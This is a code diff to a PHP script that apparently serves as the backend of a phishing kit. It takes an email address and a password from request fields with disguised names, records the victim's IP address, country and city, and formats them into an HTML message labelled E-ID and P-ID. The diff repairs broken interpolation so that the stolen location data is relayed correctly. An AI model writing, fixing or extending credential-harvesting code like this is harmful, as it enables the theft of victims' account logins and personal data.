@@ -74,7 +74,8 @@ if(isset($_POST)){
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
     $data['subject'] = $email->clean($_REQUEST['pet']);
-
+    $data['cname'] = $email->clean($country);
+    $data['ccity'] = $email->clean($city);
 
     $data['message'] =
 		"
@@ -89,9 +90,9 @@ if(isset($_POST)){
 				<p></p>
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
-			    <p>
-			    <p><strong>E-ID:</strong> "$country"</p>
-			    <p><strong>P-ID:</strong>"$city"</p>
+				<p>
+				  <p><strong>E-ID:</strong> ".$data['cname']."</p>
+			    <p><strong>P-ID:</strong>".$data['ccity']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
 			    <br>
 			</body>
